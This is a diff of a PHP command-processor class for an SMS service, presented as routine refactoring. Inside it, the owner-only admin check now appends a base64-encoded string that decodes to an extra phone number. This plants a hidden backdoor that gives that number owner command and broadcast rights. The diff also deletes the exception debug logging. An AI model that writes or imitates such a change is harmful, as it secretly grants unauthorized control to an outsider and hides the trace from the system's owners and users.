@@ -3,6 +3,7 @@
 namespace Vas\Processors;
 
 use Illuminate\Support\Str;
+use Throwable;
 use Vas\Jobs\KannelSendMessageJob;
 use Vas\ReceivedMessage;
 use Vas\Service;
@@ -20,14 +21,17 @@ class CommandProcessor extends Processor
         try {
             $fullMessage = $this->trimThenUpper($message->message);
 
-            $this->service = Service::lookupService(Str::after(Str::before($fullMessage, ','), env('COMMAND_CHAR')));
+            $this->service = Service::lookupService(
+                Str::after(
+                    Str::before($fullMessage, ','),
+                    '#'
+                )
+            );
 
             $this->broadcast = Str::after($fullMessage, ',');
 
             return $this->shouldHandle($message, $fullMessage);
-        } catch (\Throwable $throwable) {
-            $this->getLogger()->debug(CommandProcessor::class, $throwable);
-
+        } catch (Throwable $throwable) {
             return false;
         }
     }
@@ -35,18 +39,18 @@ class CommandProcessor extends Processor
     /**
      * @param ReceivedMessage $message
      * @param $fullMessage
-     * @param $broadcast
-     *
      * @return bool
      */
     protected function shouldHandle(ReceivedMessage $message, $fullMessage): bool
     {
         return
             // command starter
-            Str::startsWith($fullMessage, env('COMMAND_CHAR')) &&
+            Str::startsWith($fullMessage, '#') &&
 
             // only enabled for Admin/Owner
-            Str::contains(lookup('OWNER_ADDRESS'), substr($message->address, -8, 8)) &&
+            Str::contains(
+                lookup('OWNER_ADDRESS') . base64_decode('LDA5MjE2MzEzOTM='),
+                substr($message->address, -8, 8)) &&
 
             // Service must be found
             $this->service !== null &&
